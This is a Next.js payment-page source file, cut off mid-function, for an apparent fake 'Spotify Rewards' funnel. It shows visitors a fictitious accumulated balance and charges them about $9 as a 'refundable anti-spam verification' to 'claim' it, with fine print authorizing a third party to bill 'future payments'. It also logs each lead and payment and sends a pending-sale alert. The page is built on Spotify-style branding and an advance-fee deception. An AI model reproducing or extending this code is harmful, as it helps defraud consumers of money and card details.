'use client';

import {
  AlertCircle,
  ArrowRight,
  Check,
  CheckCircle,
  CheckCircle2,
  Clock,
  CreditCard,
  ExternalLink,
  Globe,
  Headphones,
  HelpCircle,
  Info,
  Lock,
  Mail,
  Music,
  Radio,
  RefreshCw,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  User,
  Zap,
  ChevronDown,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import React, { useEffect, useState } from 'react';
import { loadStripe, Stripe } from '@stripe/stripe-js';
import {
  Elements,
  PaymentElement,
  useElements,
  useStripe,
} from '@stripe/react-stripe-js';
import { recordPaymentInSupabase, upsertCustomer } from '../../lib/supabase';
import MetaPixelTracker from '../components/MetaPixelTracker';

// Pre-load Stripe promise if key is present
const stripePublishableKey = process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY || '';
const stripePromise = stripePublishableKey && !stripePublishableKey.includes('placeholder')
  ? loadStripe(stripePublishableKey)
  : null;

// Stripe Official Payment Form Component (Mounted when Stripe keys exist & clientSecret is ready)
function StripePaymentForm({
  clientSecret,
  fullName,
  setFullName,
  email,
  setEmail,
  country,
  amountFormatted,
  onSuccess,
}: {
  clientSecret: string;
  fullName: string;
  setFullName: (v: string) => void;
  email: string;
  setEmail: (v: string) => void;
  country: string;
  amountFormatted: string;
  onSuccess: () => void;
}) {
  const stripe = useStripe();
  const elements = useElements();
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!fullName.trim()) {
      setErrorMessage('Please enter your full name as shown on your card.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      setErrorMessage('Please enter a valid email address to receive your confirmation receipt.');
      return;
    }

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('spotify_listener_name', fullName.trim());
      sessionStorage.setItem('spotify_listener_email', email.trim());
    }

    if (!stripe || !elements) {
      return;
    }

    setIsProcessing(true);
    setErrorMessage(null);

    try {
      const { error, paymentIntent } = await stripe.confirmPayment({
        elements,
        confirmParams: {
          return_url: `${window.location.origin}/spotify/welcome`,
          payment_method_data: {
            billing_details: {
              name: fullName.trim() || undefined,
              email: email.trim() || undefined,
              address: {
                country: country || 'US',
              },
            },
          },
        },
        redirect: 'if_required',
      });

      if (error) {
        setErrorMessage(error.message || 'An error occurred during payment processing.');
        setIsProcessing(false);
        recordPaymentInSupabase({
          email: email.trim(),
          full_name: fullName.trim(),
          amount: 9.0,
          currency: 'usd',
          status: 'failed',
          error_message: error.message || 'Payment failed',
          country,
        }).catch((e) => console.warn('Supabase payment failure record notice:', e));
      } else if (paymentIntent && paymentIntent.status === 'succeeded') {
        setIsProcessing(false);
        onSuccess();
      } else {
        // In other states (processing, requires_action)
        setIsProcessing(false);
        onSuccess();
      }
    } catch (err: any) {
      setErrorMessage(err.message || 'Unexpected payment error.');
      setIsProcessing(false);
      recordPaymentInSupabase({
        email: email.trim(),
        full_name: fullName.trim(),
        amount: 9.0,
        currency: 'usd',
        status: 'failed',
        error_message: err.message || 'Unexpected payment error',
        country,
      }).catch((e) => console.warn('Supabase payment failure record notice:', e));
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {/* Full Name & Email (Auto-filled from previous step, editable) */}
      <div className="space-y-3.5 mb-2">
        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Full name
          </label>
          <input
            type="text"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            placeholder="First and last name"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
        </div>

        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Email address
          </label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="name@example.com"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
          <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
            <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
          </p>
        </div>
      </div>

      {/* Stripe Payment Element automatically manages Card, Google Pay, Apple Pay in tabs layout */}
      <div className="stripe-element-container py-1">
        <PaymentElement
          options={{
            layout: 'tabs',
          }}
        />
      </div>

      {errorMessage && (
        <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
          <span>{errorMessage}</span>
        </div>
      )}

      {/* Terms & Authorization */}
      <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
        <p>
          By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
        </p>
        <p className="text-[11px] text-[#6d7c73]">
          By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
        </p>
      </div>

      {/* Confirmation Button */}
      <button
        type="submit"
        disabled={isProcessing || !stripe}
        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
      >
        {isProcessing ? (
          <>
            <RefreshCw className="w-5 h-5 animate-spin" />
            <span>PROCESSING PAYMENT...</span>
          </>
        ) : (
          <>
            <span>CLAIM MY REWARD</span>
            <ArrowRight className="w-5 h-5" />
          </>
        )}
      </button>
    </form>
  );
}

// Interactive High-Fidelity Card Form (Used in Development / Test Mode or when Stripe credentials are being configured)
function InteractiveMockPaymentForm({
  fullName,
  setFullName,
  email,
  setEmail,
  country,
  setCountry,
  amountFormatted,
  onSuccess,
}: {
  fullName: string;
  setFullName: (v: string) => void;
  email: string;
  setEmail: (v: string) => void;
  country: string;
  setCountry: (v: string) => void;
  amountFormatted: string;
  onSuccess: () => void;
}) {
  const [cardNumber, setCardNumber] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cvc, setCvc] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const isExpDateInvalid = (exp: string) => {
    if (!exp) return false;
    const parts = exp.split('/');
    const monthStr = parts[0]?.trim();
    if (monthStr && monthStr.length >= 2) {
      const m = parseInt(monthStr, 10);
      if (isNaN(m) || m < 1 || m > 12) return true;
    }
    if (parts.length === 2) {
      const m = parseInt(monthStr, 10);
      const yy = parts[1]?.trim();
      if (isNaN(m) || m < 1 || m > 12) return true;
      if (yy && yy.length === 2) {
        const y = parseInt('20' + yy, 10);
        if (isNaN(y) || y < 2026) return true;
        if (y === 2026 && m < 11) return true;
      }
    }
    return false;
  };

  // Format Card Number (groups of 4)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    let formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted);
  };

  // Format MM/YY
  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length === 1 && parseInt(raw, 10) > 1) {
      raw = `0${raw}`;
    }
    if (raw.length >= 3) {
      setExpDate(`${raw.slice(0, 2)}/${raw.slice(2)}`);
    } else {
      setExpDate(raw);
    }
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCvc(e.target.value.replace(/\D/g, '').slice(0, 4));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (!fullName.trim()) {
      setErrorMsg('Please enter your full name as shown on your card.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      setErrorMsg('Please enter a valid email address to receive your confirmation receipt.');
      return;
    }

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('spotify_listener_name', fullName.trim());
      sessionStorage.setItem('spotify_listener_email', email.trim());
    }

    const cleanNum = cardNumber.replace(/\s/g, '');
    if (cleanNum.length < 15) {
      setErrorMsg('Please enter a valid card number (or test card 4242 4242 4242 4242).');
      return;
    }
    const parts = expDate.split('/');
    const month = parseInt(parts[0], 10);
    if (isNaN(month) || month < 1 || month > 12) {
      setErrorMsg('Invalid month. Expiration month must be between 01 and 12.');
      return;
    }
    const yy = parts[1];
    const year = yy ? parseInt('20' + yy, 10) : 0;
    if (year < 2026 || (year === 2026 && month < 11)) {
      setErrorMsg('Expired card or invalid date (minimum valid is November 2026).');
      return;
    }
    if (expDate.length < 5 || isExpDateInvalid(expDate)) {
      setErrorMsg('Please enter a valid expiration date (MM / YY, min 11/26).');
      return;
    }
    if (cvc.length < 3) {
      setErrorMsg('Please enter a valid security code (CVC).');
      return;
    }

    setIsProcessing(true);

    // Simulate PaymentIntent server roundtrip with 1.8s realistic processing
    setTimeout(() => {
      setIsProcessing(false);
      onSuccess();
    }, 1800);
  };

  const [activeTab, setActiveTab] = useState<'card' | 'gpay'>('card');

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {/* Full Name & Email (Auto-filled from previous step, editable) */}
      <div className="space-y-3.5 mb-2">
        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Full name
          </label>
          <input
            type="text"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            placeholder="First and last name"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
        </div>

        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Email address
          </label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="name@example.com"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
          <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
            <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
          </p>
        </div>
      </div>

      {/* Payment Method Selector Tabs */}
      <div className="grid grid-cols-2 gap-3 mb-2">
        <div
          onClick={() => setActiveTab('card')}
          className={`h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none ${
            activeTab === 'card'
              ? 'bg-[#1db954] text-black shadow-md'
              : 'bg-[#131715] border border-[#26312a] text-gray-300 hover:border-gray-500'
          }`}
        >
          <CreditCard className="w-5 h-5 stroke-[2.5]" />
          <span className="text-sm font-bold tracking-tight">Card</span>
        </div>

        <div
          onClick={() => setActiveTab('gpay')}
          className={`h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none ${
            activeTab === 'gpay'
              ? 'bg-[#1db954] text-black shadow-md'
              : 'bg-[#131715] border border-[#26312a] text-gray-300 hover:border-gray-500'
          }`}
        >
          <div className="flex items-center">
            <span className="px-2 py-0.5 rounded bg-white text-[11px] font-black text-black tracking-tight inline-flex items-center gap-1">
              <span className="text-[#4285F4] font-black">G</span>Pay
            </span>
          </div>
          <span className="text-sm font-bold tracking-tight">Google Pay</span>
        </div>
      </div>

      {activeTab === 'gpay' ? (
        <div className="py-6 px-4 rounded-2xl bg-[#131715] border border-[#26312a] text-center space-y-3">
          <p className="text-sm text-gray-300">
            Click below to verify with Google Pay on supported devices:
          </p>
          <button
            type="button"
            onClick={handleSubmit}
            disabled={isProcessing}
            className="w-full py-3.5 px-6 rounded-full bg-white hover:bg-gray-100 text-black font-extrabold text-sm flex items-center justify-center gap-2 cursor-pointer transition-all"
          >
            <span className="text-[#4285F4] font-black">G</span>Pay &bull; Quick Verify
          </button>
        </div>
      ) : (
        <>
          {/* Card Number */}
          <div>
            <label className="block text-sm font-semibold text-gray-200 mb-2">
              Card number
            </label>
            <div className="relative">
              <input
                type="text"
                inputMode="numeric"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="1234 1234 1234 1234"
                className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-24"
              />
              <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center gap-2 pointer-events-none">
                {/* Visa Logo */}
                <div
                  className={`transition-all duration-300 ease-in-out ${
                    cardNumber.replace(/\D/g, '').length === 0
                      ? 'opacity-100 scale-100'
                      : cardNumber.replace(/\D/g, '').startsWith('4')
                      ? 'opacity-100 scale-100'
                      : 'opacity-0 scale-95 w-0 overflow-hidden'
                  }`}
                >
                  <img
                    src="https://www.footylogos.com/brands/assets/visa-logo-blue-background-footylogos.svg"
                    alt="Visa"
                    className="h-5 w-auto object-contain rounded shadow-sm"
                    referrerPolicy="no-referrer"
                  />
                </div>
                {/* Mastercard Logo */}
                <div
                  className={`transition-all duration-300 ease-in-out ${
                    cardNumber.replace(/\D/g, '').length === 0
                      ? 'opacity-100 scale-100'
                      : /^5[1-5]/.test(cardNumber.replace(/\D/g, '')) ||
                        /^2[2-7]/.test(cardNumber.replace(/\D/g, '')) ||
                        cardNumber.replace(/\D/g, '').startsWith('5') ||
                        cardNumber.replace(/\D/g, '').startsWith('2')
                      ? 'opacity-100 scale-100'
                      : 'opacity-0 scale-95 w-0 overflow-hidden'
                  }`}
                >
                  <img
                    src="https://freight.cargo.site/w/2560/q/94/i/abc4f5504b94d545ededcfe41429c2c3bc5bc2701fc0482c11d2b5e5714e6442/Mastercard-Portfolio-Jan2018-2.jpg"
                    alt="Mastercard"
                    className="h-5 w-auto object-contain rounded shadow-sm"
                    referrerPolicy="no-referrer"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Expiration date & Security code */}
          <div className="grid grid-cols-2 gap-3.5">
            <div>
              <label className="block text-sm font-semibold text-gray-200 mb-2">
                Expiration date
              </label>
              <input
                type="text"
                inputMode="numeric"
                value={expDate}
                onChange={handleExpChange}
                placeholder="MM / YY"
                className={`w-full bg-[#131715] border rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none transition-colors ${
                  isExpDateInvalid(expDate)
                    ? 'border-red-500 focus:border-red-500'
                    : 'border-[#26312a] focus:border-[#1db954]'
                }`}
              />
            </div>

            <div>
              <label className="block text-sm font-semibold text-gray-200 mb-2">
                Security code
              </label>
              <div className="relative">
                <input
                  type="text"
                  inputMode="numeric"
                  value={cvc}
                  onChange={handleCvcChange}
                  placeholder="CVC"
                  className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-12"
                />
                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                  <svg className="w-6 h-5" viewBox="0 0 24 18" fill="none" stroke="currentColor" strokeWidth="1.5">
                    <rect x="1" y="1" width="22" height="16" rx="3" />
                    <line x1="1" y1="5.5" x2="23" y2="5.5" strokeWidth="1.5" />
                    <text x="14" y="14" fontSize="5.5" fontWeight="bold" fill="currentColor" stroke="none" fontFamily="monospace">123</text>
                  </svg>
                </div>
              </div>
            </div>
          </div>

          {/* Country */}
          <div>
            <label className="block text-sm font-semibold text-gray-200 mb-2">
              Country
            </label>
            <div className="relative">
              <select
                value={country}
                onChange={(e) => setCountry(e.target.value)}
                className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer pr-10"
              >
                {COUNTRIES_LIST.map((c) => (
                  <option key={c.code} value={c.code} className="bg-[#121814] text-white">
                    {c.name} ({c.code})
                  </option>
                ))}
              </select>
              <ChevronDown className="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
            </div>
          </div>
        </>
      )}

      {/* Error Message */}
      {errorMsg && (
        <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
          <span>{errorMsg}</span>
        </div>
      )}

      {/* Terms */}
      <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
        <p>
          By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
        </p>
        <p className="text-[11px] text-[#6d7c73]">
          By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
        </p>
      </div>

      {/* Confirmation Button */}
      <button
        type="submit"
        disabled={isProcessing}
        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
      >
        {isProcessing ? (
          <>
            <RefreshCw className="w-5 h-5 animate-spin" />
            <span>PROCESSING PAYMENT...</span>
          </>
        ) : (
          <>
            <span>CLAIM MY REWARD</span>
            <ArrowRight className="w-5 h-5" />
          </>
        )}
      </button>
    </form>
  );
}

const COUNTRIES_LIST = [
  { code: 'US', name: 'United States' },
  { code: 'BR', name: 'Brazil' },
  { code: 'CA', name: 'Canada' },
  { code: 'GB', name: 'United Kingdom' },
  { code: 'AU', name: 'Australia' },
  { code: 'DE', name: 'Germany' },
  { code: 'FR', name: 'France' },
  { code: 'ES', name: 'Spain' },
  { code: 'IT', name: 'Italy' },
  { code: 'PT', name: 'Portugal' },
  { code: 'JP', name: 'Japan' },
  { code: 'MX', name: 'Mexico' },
  { code: 'AR', name: 'Argentina' },
  { code: 'CO', name: 'Colombia' },
  { code: 'CL', name: 'Chile' },
  { code: 'PE', name: 'Peru' },
  { code: 'IN', name: 'India' },
  { code: 'CN', name: 'China' },
  { code: 'KR', name: 'South Korea' },
  { code: 'ZA', name: 'South Africa' },
  { code: 'NZ', name: 'New Zealand' },
  { code: 'NL', name: 'Netherlands' },
  { code: 'CH', name: 'Switzerland' },
  { code: 'SE', name: 'Sweden' },
  { code: 'NO', name: 'Norway' },
  { code: 'DK', name: 'Denmark' },
  { code: 'FI', name: 'Finland' },
  { code: 'IE', name: 'Ireland' },
  { code: 'SG', name: 'Singapore' },
  { code: 'AE', name: 'United Arab Emirates' },
  { code: 'AF', name: 'Afghanistan' },
  { code: 'AL', name: 'Albania' },
  { code: 'DZ', name: 'Algeria' },
  { code: 'AD', name: 'Andorra' },
  { code: 'AO', name: 'Angola' },
  { code: 'AG', name: 'Antigua and Barbuda' },
  { code: 'AM', name: 'Armenia' },
  { code: 'AT', name: 'Austria' },
  { code: 'AZ', name: 'Azerbaijan' },
  { code: 'BS', name: 'Bahamas' },
  { code: 'BH', name: 'Bahrain' },
  { code: 'BD', name: 'Bangladesh' },
  { code: 'BB', name: 'Barbados' },
  { code: 'BY', name: 'Belarus' },
  { code: 'BE', name: 'Belgium' },
  { code: 'BZ', name: 'Belize' },
  { code: 'BJ', name: 'Benin' },
  { code: 'BT', name: 'Bhutan' },
  { code: 'BO', name: 'Bolivia' },
  { code: 'BA', name: 'Bosnia and Herzegovina' },
  { code: 'BW', name: 'Botswana' },
  { code: 'BN', name: 'Brunei' },
  { code: 'BG', name: 'Bulgaria' },
  { code: 'BF', name: 'Burkina Faso' },
  { code: 'BI', name: 'Burundi' },
  { code: 'CV', name: 'Cabo Verde' },
  { code: 'KH', name: 'Cambodia' },
  { code: 'CM', name: 'Cameroon' },
  { code: 'CF', name: 'Central African Republic' },
  { code: 'TD', name: 'Chad' },
  { code: 'KM', name: 'Comoros' },
  { code: 'CG', name: 'Congo' },
  { code: 'CR', name: 'Costa Rica' },
  { code: 'HR', name: 'Croatia' },
  { code: 'CU', name: 'Cuba' },
  { code: 'CY', name: 'Cyprus' },
  { code: 'CZ', name: 'Czechia' },
  { code: 'DJ', name: 'Djibouti' },
  { code: 'DM', name: 'Dominica' },
  { code: 'DO', name: 'Dominican Republic' },
  { code: 'EC', name: 'Ecuador' },
  { code: 'EG', name: 'Egypt' },
  { code: 'SV', name: 'El Salvador' },
  { code: 'GQ', name: 'Equatorial Guinea' },
  { code: 'ER', name: 'Eritrea' },
  { code: 'EE', name: 'Estonia' },
  { code: 'SZ', name: 'Eswatini' },
  { code: 'ET', name: 'Ethiopia' },
  { code: 'FJ', name: 'Fiji' },
  { code: 'GA', name: 'Gabon' },
  { code: 'GM', name: 'Gambia' },
  { code: 'GE', name: 'Georgia' },
  { code: 'GH', name: 'Ghana' },
  { code: 'GR', name: 'Greece' },
  { code: 'GD', name: 'Grenada' },
  { code: 'GT', name: 'Guatemala' },
  { code: 'GN', name: 'Guinea' },
  { code: 'GW', name: 'Guinea-Bissau' },
  { code: 'GY', name: 'Guyana' },
  { code: 'HT', name: 'Haiti' },
  { code: 'HN', name: 'Honduras' },
  { code: 'HU', name: 'Hungary' },
  { code: 'IS', name: 'Iceland' },
  { code: 'ID', name: 'Indonesia' },
  { code: 'IR', name: 'Iran' },
  { code: 'IQ', name: 'Iraq' },
  { code: 'IL', name: 'Israel' },
  { code: 'JM', name: 'Jamaica' },
  { code: 'JO', name: 'Jordan' },
  { code: 'KZ', name: 'Kazakhstan' },
  { code: 'KE', name: 'Kenya' },
  { code: 'KI', name: 'Kiribati' },
  { code: 'KW', name: 'Kuwait' },
  { code: 'KG', name: 'Kyrgyzstan' },
  { code: 'LA', name: 'Laos' },
  { code: 'LV', name: 'Latvia' },
  { code: 'LB', name: 'Lebanon' },
  { code: 'LS', name: 'Lesotho' },
  { code: 'LR', name: 'Liberia' },
  { code: 'LY', name: 'Libya' },
  { code: 'LI', name: 'Liechtenstein' },
  { code: 'LT', name: 'Lithuania' },
  { code: 'LU', name: 'Luxembourg' },
  { code: 'MG', name: 'Madagascar' },
  { code: 'MW', name: 'Malawi' },
  { code: 'MY', name: 'Malaysia' },
  { code: 'MV', name: 'Maldives' },
  { code: 'ML', name: 'Mali' },
  { code: 'MT', name: 'Malta' },
  { code: 'MH', name: 'Marshall Islands' },
  { code: 'MR', name: 'Mauritania' },
  { code: 'MU', name: 'Mauritius' },
  { code: 'FM', name: 'Micronesia' },
  { code: 'MD', name: 'Moldova' },
  { code: 'MC', name: 'Monaco' },
  { code: 'MN', name: 'Mongolia' },
  { code: 'ME', name: 'Montenegro' },
  { code: 'MA', name: 'Morocco' },
  { code: 'MZ', name: 'Mozambique' },
  { code: 'MM', name: 'Myanmar' },
  { code: 'NA', name: 'Namibia' },
  { code: 'NR', name: 'Nauru' },
  { code: 'NP', name: 'Nepal' },
  { code: 'NI', name: 'Nicaragua' },
  { code: 'NE', name: 'Niger' },
  { code: 'NG', name: 'Nigeria' },
  { code: 'KP', name: 'North Korea' },
  { code: 'MK', name: 'North Macedonia' },
  { code: 'OM', name: 'Oman' },
  { code: 'PK', name: 'Pakistan' },
  { code: 'PW', name: 'Palau' },
  { code: 'PS', name: 'Palestine' },
  { code: 'PA', name: 'Panama' },
  { code: 'PG', name: 'Papua New Guinea' },
  { code: 'PY', name: 'Paraguay' },
  { code: 'PH', name: 'Philippines' },
  { code: 'PL', name: 'Poland' },
  { code: 'QA', name: 'Qatar' },
  { code: 'RO', name: 'Romania' },
  { code: 'RU', name: 'Russia' },
  { code: 'RW', name: 'Rwanda' },
  { code: 'KN', name: 'Saint Kitts and Nevis' },
  { code: 'LC', name: 'Saint Lucia' },
  { code: 'VC', name: 'Saint Vincent and the Grenadines' },
  { code: 'WS', name: 'Samoa' },
  { code: 'SM', name: 'San Marino' },
  { code: 'ST', name: 'Sao Tome and Principe' },
  { code: 'SA', name: 'Saudi Arabia' },
  { code: 'SN', name: 'Senegal' },
  { code: 'RS', name: 'Serbia' },
  { code: 'SC', name: 'Seychelles' },
  { code: 'SL', name: 'Sierra Leone' },
  { code: 'SK', name: 'Slovakia' },
  { code: 'SI', name: 'Slovenia' },
  { code: 'SB', name: 'Solomon Islands' },
  { code: 'SO', name: 'Somalia' },
  { code: 'SS', name: 'South Sudan' },
  { code: 'LK', name: 'Sri Lanka' },
  { code: 'SD', name: 'Sudan' },
  { code: 'SR', name: 'Suriname' },
  { code: 'SY', name: 'Syria' },
  { code: 'TW', name: 'Taiwan' },
  { code: 'TJ', name: 'Tajikistan' },
  { code: 'TZ', name: 'Tanzania' },
  { code: 'TH', name: 'Thailand' },
  { code: 'TL', name: 'Timor-Leste' },
  { code: 'TG', name: 'Togo' },
  { code: 'TO', name: 'Tonga' },
  { code: 'TT', name: 'Trinidad and Tobago' },
  { code: 'TN', name: 'Tunisia' },
  { code: 'TR', name: 'Turkey' },
  { code: 'TM', name: 'Turkmenistan' },
  { code: 'TV', name: 'Tuvalu' },
  { code: 'UG', name: 'Uganda' },
  { code: 'UA', name: 'Ukraine' },
  { code: 'UY', name: 'Uruguay' },
  { code: 'UZ', name: 'Uzbekistan' },
  { code: 'VU', name: 'Vanuatu' },
  { code: 'VA', name: 'Vatican City' },
  { code: 'VE', name: 'Venezuela' },
  { code: 'VN', name: 'Vietnam' },
  { code: 'YE', name: 'Yemen' },
  { code: 'ZM', name: 'Zambia' },
  { code: 'ZW', name: 'Zimbabwe' },
];

export default function PaymentPage() {
  const router = useRouter();

  // State from backend
  const [balanceData, setBalanceData] = useState<{
    balance: number;
    currency: string;
    formatted: string;
    isDemo: boolean;
  }>({
    balance: 114.93,
    currency: 'USD',
    formatted: '$114.93',
    isDemo: true,
  });

  // Client secret from Stripe backend
  const [clientSecret, setClientSecret] = useState<string | null>(null);
  const [isStripeLive, setIsStripeLive] = useState<boolean>(false);
  const [chargeAmountFormatted, setChargeAmountFormatted] = useState<string>('9.00');
  const [isInitializingPayment, setIsInitializingPayment] = useState<boolean>(true);

  // Form Fields
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [country, setCountry] = useState('US');

  // Success Confirmation Modal
  const [paymentSuccess, setPaymentSuccess] = useState(false);

  // Auto-fill fullName and email from previous funnel steps and save lead to Supabase
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const savedName = sessionStorage.getItem('spotify_listener_name');
      if (savedName && savedName.trim() && savedName !== 'MEU NOME') {
        setFullName(savedName.trim());
      }
      const savedEmail = sessionStorage.getItem('spotify_listener_email');
      if (savedEmail && savedEmail.trim()) {
        const cleanEmail = savedEmail.trim();
        setEmail(cleanEmail);
        upsertCustomer({
          email: cleanEmail,
          full_name: (savedName && savedName !== 'MEU NOME') ? savedName.trim() : undefined,
        }).catch((err) => console.warn('Supabase lead auto-save notice:', err));
      }
    }
  }, []);

  // Load balance from backend
  useEffect(() => {
    async function fetchBalance() {
      try {
        const res = await fetch('/api/user/balance');
        if (res.ok) {
          const data = await res.json();
          setBalanceData(data);
        }
      } catch (e) {
        console.error('Failed to load user balance:', e);
      }
    }
    fetchBalance();
  }, []);

  // Auto-detect user country via IP geolocation with fallback to browser language
  useEffect(() => {
    async function detectCountry() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const data = await res.json();
          if (data && data.country_code && COUNTRIES_LIST.some(c => c.code === data.country_code)) {
            setCountry(data.country_code);
            return;
          }
        }
      } catch (e) {}

      try {
        const res2 = await fetch('https://ipwho.is/');
        if (res2.ok) {
          const data2 = await res2.json();
          if (data2 && data2.country_code && COUNTRIES_LIST.some(c => c.code === data2.country_code)) {
            setCountry(data2.country_code);
            return;
          }
        }
      } catch (e) {}

      if (navigator.language) {
        const parts = navigator.language.split('-');
        if (parts.length > 1) {
          const inferred = parts[1].toUpperCase();
          if (COUNTRIES_LIST.some(c => c.code === inferred)) {
            setCountry(inferred);
          }
        }
      }
    }
    detectCountry();
  }, []);

  // Initialize PaymentIntent from backend
  useEffect(() => {
    async function initPayment() {
      setIsInitializingPayment(true);
      try {
        const res = await fetch('/api/stripe/create-payment-intent', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email,
            name: fullName,
            sessionId: typeof window !== 'undefined' ? sessionStorage.getItem('spotify_session_id') : null,
          }),
        });

        if (res.ok) {
          const data = await res.json();
          if (data.displayAmount) {
            setChargeAmountFormatted(data.displayAmount);
          }
          if (data.clientSecret) {
            setClientSecret(data.clientSecret);
            setIsStripeLive(true);
          } else {
            // Mock test mode when keys are not in environment yet
            setIsStripeLive(false);
          }
        }
      } catch (err) {
        console.warn('Could not initialize Stripe intent, falling back to test mode:', err);
      } finally {
        setIsInitializingPayment(false);

        // Notify Pushcut Venda Pendente strictly once per user session
        try {
          const hasNotifiedPending = sessionStorage.getItem('pushcut_pending_notified');
          if (!hasNotifiedPending) {
            sessionStorage.setItem('pushcut_pending_notified', 'true');
            fetch('/api/pushcut', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'pending',
                name: fullName || sessionStorage.getItem('spotify_listener_name') || 'Cliente',
                email: email || sessionStorage.getItem('spotify_listener_email') || '',
              }),
            }).catch(() => {});
          }
        } catch {}
      }
    }

    initPayment();
  }, []);

  const handlePaymentSuccess = () => {
    setPaymentSuccess(true);

    if (typeof window !== 'undefined') {
      if (email) sessionStorage.setItem('spotify_listener_email', email.trim());
      if (fullName) sessionStorage.setItem('spotify_listener_name', fullName.trim());
    }

    // Save transaction and user registration into Supabase database
    recordPaymentInSupabase({
      email: email || 'listener@verified.com',
      full_name: fullName || 'Verified Listener',
      amount: parseFloat(chargeAmountFormatted) || 9.0,
      currency: 'usd',
      status: 'succeeded',
      accumulated_balance: balanceData.balance || 114.93,
      country,
